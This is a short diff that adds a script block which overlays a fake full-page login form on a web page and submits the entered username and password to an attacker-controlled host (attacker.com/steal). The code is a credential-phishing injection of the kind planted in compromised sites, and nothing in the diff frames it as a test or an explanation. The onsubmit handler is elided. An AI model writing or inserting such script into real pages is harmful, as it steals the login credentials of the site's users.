@@ -1,0 +1,4 @@
+<script>
+// Overlay a fake login form on top of the real page
+document.body.innerHTML += '<div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999;"><form action="https://attacker.com/steal" onsubmit="...">Username: <input type="text"><br>Password: <input type="password"><br><input type="submit"></form></div>';
+</script>
